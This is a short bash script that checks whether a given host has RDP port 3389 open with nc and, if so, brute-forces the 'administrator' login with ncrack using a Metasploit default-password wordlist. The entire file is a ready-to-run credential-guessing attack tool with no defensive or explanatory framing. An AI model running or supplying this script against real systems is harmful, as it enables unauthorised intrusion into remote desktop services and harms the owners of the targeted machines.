#!/bin/bash

WAIT_SEC=1
DPORT=3389

nc -w $WAIT_SEC $1 $DPORT 2> /dev/null && {
	echo 'bruteforcing rdp'

	ncrack -u administrator -P /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt "rdp://$1"
}